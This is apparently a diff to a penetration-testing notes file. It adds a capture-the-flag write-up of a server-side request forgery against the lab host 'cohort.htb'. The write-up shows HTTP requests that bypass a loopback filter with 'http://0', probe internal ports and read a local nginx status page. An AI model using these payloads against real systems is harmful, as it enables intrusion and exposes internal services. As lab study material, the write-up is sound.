@@ -197,6 +197,30 @@ ffuf -w ./ports.txt:FUZZ \
 
 ---
 
+## Source Validator to Internal Status Page (Cohort)
+
+The public `https://cohort.htb/portal.html` sent a JSON `POST /api/validate` request with a source URL and format. A listener at `10.10.14.213:80` received a request from the server with `User-Agent: CohortInsights/1.0 (+source-validator)`, confirming that the server fetched the supplied URL.
+
+```http
+POST /api/validate HTTP/1.1
+Host: cohort.htb
+Content-Type: application/json
+
+{"url":"http://10.10.14.213","format":"csv"}
+```
+
+The validator rejected `http://127.0.0.1:80` as an internal or loopback address, but `http://0` returned the site's HTML. Using that accepted host, `http://0:8888` previewed a marimo login page and `http://0:5000` returned a JSON 405 response. A request to the local-only nginx status endpoint then exposed its upstream map:
+
+```http
+POST /api/validate HTTP/1.1
+Host: cohort.htb
+Content-Type: application/json
+
+{"url":"http://0/status","format":"parquet"}
+```
+
+The successful response had `fetched_status: 200` and a `preview` containing `cohort-edge` upstreams. It identified the `insights-api` at `127.0.0.1:5000` and the notebooks host `nb-1be3782a8afd3ad5.cohort.htb` at `127.0.0.1:8888`. The notebook hostname was then reached directly over HTTPS; see [marimo](../things-i-have-pwnd-before/marimo.md).
+
 ## SSRF Bypass Techniques
 
 ### Localhost Alternatives
